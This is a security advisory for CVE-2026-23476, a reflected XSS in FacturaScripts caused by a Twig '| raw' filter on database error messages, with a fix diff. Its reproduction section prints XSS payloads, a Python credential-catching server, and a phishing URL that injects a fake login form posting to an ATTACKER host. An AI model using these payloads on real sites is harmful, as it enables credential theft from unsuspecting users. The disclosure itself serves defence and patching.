# [M] FacturaScripts is Vulnerable to Reflected XSS

## Summary
Severity: Medium
Advisory: GHSA-g6w2-q45f-xrp4
CVE: CVE-2026-23476
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-02-02
Source: https://github.com/advisories/GHSA-g6w2-q45f-xrp4
Type: github-advisory

## Affected
- Packagist: `facturascripts/facturascripts` — affected >=0 <2025.81

## Details
# Reflected XSS via SQL Error Messages

## Summary

A reflected XSS bug has been found in FacturaScripts. The problem is in how error messages get displayed - it's using Twig's `| raw` filter which skips HTML escaping. When a database error is triggered (like passing a string where an integer is expected), the error message includes all input and gets rendered without sanitization.

Attackers can use this to phish credentials from other users since HttpOnly is set on cookies (so stealing cookies directly won't work, but attackers can inject a fake login form).

**CVSS 6.1 (Medium-High)**

---

## What was Found

### Where the bug exists in the code:

`Core/View/Macro/Utils.html.twig`, line 27:

```twig
{% for item in messages %}
    <div>{{ item.message | raw }}</div>
{% endfor %}
```

That `| raw` is the problem. It tells Twig not to escape anything.

### How it works

So here's what happens:

1. Hhit `/EditProducto?code=<svg onload=alert(1)> or <img src=x onerror=alert(1)>`
2. The app tries to look up a product with that "code"
3. PostgreSQL throws an error because `<svg onload=alert(1)>` isn't a valid integer
4. The error goes something like:   ```
   ERROR: invalid input syntax for type integer: "<svg onload=alert(1)>"
   LINE 1: SELECT * FROM "productos" WHERE "idproducto" = '<img src=x onerror=alert(1)>"
   ```
5. This gets logged via MiniLog and displayed to the user
6. Because of `| raw`, the browser actually executes the JS

The error logging happens in `Core/Base/DataBase.php` around line 236:

```php
self::$miniLog->error(self::$engine->errorMessage(self::$link), ['sql' => $sql]);
```

And PostgreSQL's error message includes whatever garbage it was sent.

---

## Reproduction Steps

### Requirements
- Working FacturaScripts install
- Any user account (doesn't need to be admin)
- The victim needs to be logged in

### Quick test

Just visit this URL while logged in:
```
http://localhost/EditProducto?code=<svg onload=alert(document.domain)>
```

An alert box should  pop up.

### For a real attack (credential phishing)

Set up a simple server to catch credentials:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        q = parse_qs(urlparse(self.path).query)
        print(f"\nGot creds:")
        print(f"  User: {q.get('user', ['?'])[0]}")
        print(f"  Pass: {q.get('pass', ['?'])[0]}")
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args): pass

HTTPServer(('', 8888), Handler).serve_forever()
```

Then craft a URL that injects a fake login form:

```
http://TARGET/EditProducto?code=<svg onload="document.body.innerHTML='<div style=text-align:center;padding:100px><h2>Session Expired</h2><form action=http://ATTACKER:8888/steal><input name=user placeholder=Username><br><input name=pass type=password placeholder=Password><br><button>Login</button></form></div>'">
```

Send that to someone (email, chat, whatever). When they click it and enter their password thinking their session expired, their creds are displayed.

### Other endpoints that work

Pretty much anything that uses the `code` parameter:
- `/EditProducto?code=`
- `/EditCliente?code=`
- `/EditFacturaCliente?code=`
- `/EditProveedor?code=`
- etc.

Basically all the Edit controllers.

---

## Impact

### What attackers can do with this

**Steal credentials** - Can't grab cookies directly (HttpOnly), but the phishing form trick works great. Victim thinks their session timed out and re-enters their password.

**Read page data** - Once JS is running, attackers can scrape whatever's on the page (invoices, customer info, financial data) and send it somewhere.

**Keylog** - Inject a keylogger that captures everything they type.

**Bypass CSRF** - Grab the `multireqtoken` from the page and make requests as the victim.

### What attackers CAN'T do

Can't steal session cookies via `document.cookie` - they're HttpOnly.

### Business side

This is a financial app, so if attackers compromise an admin account, the following is possible to create or expose:
- Fake invoices
- Redirected payments  
- Customer data breach (GDPR stuff)
- The usual mess

---

## Fix

### Quick fix

Just remove `| raw` from line 27 in `Core/View/Macro/Utils.html.twig`:

```diff
-    <div>{{ item.message | raw }}</div>
+    <div>{{ item.message }}</div>
```

That's it. Twig escapes by default, so removing `| raw` fixes the XSS.

### If projects want to be thorough

1. Sanitize messages before they go into the log:
```php
$message = htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
```

2. Add CSP headers to block inline scripts as a backup

3. Maybe validate the `code` parameter format before it hits the database

---

## Resources

- https://cwe.mitre.org/data/definitions/79.html
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

**Found:** Dec 31, 2025  
**Tested on:** FacturaScripts 2025.61 (Docker), verified vulnerable in 2025.71 (GitHub latest)
<img width="1917" height="868" alt="1" src="https://github.com/user-attachments/assets/a7d770c8-1d61-499c-83dc-e21be8e61c87" />
<img width="337" height="130" alt="3" src="https://github.com/user-attachments/assets/463067ee-3a73-45ed-af26-c32264d5bf41" />
<img width="1915" height="870" alt="phising" src="https://github.com/user-attachments/assets/6e15a021-dc5f-4708-bdd1-887ecb2d2ffb" />
<img width="1915" height="862" alt="phising2" src="https://github.com/user-attachments/assets/100a63b6-c066-43d5-ab39-6085f51ba282" />
<img width="1918" height="877" alt="sql erroe" src="https://github.com/user-attachments/assets/4c3182ba-380d-44d4-ab34-4b0840ad3e39" />
<img width="1165" height="277" alt="version" src="https://github.com/user-attachments/assets/5f23e4de-cf03-4fcf-a6c5-6ca327c8c43a" />

## References
- https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-g6w2-q45f-xrp4
- https://nvd.nist.gov/vuln/detail/CVE-2026-23476
- https://github.com/NeoRazorX/facturascripts/commit/2afd98cecd26c5f8357e0e321d86063ad1012fc3
- https://github.com/NeoRazorX/facturascripts
- https://github.com/NeoRazorX/facturascripts/releases/tag/v2025.8
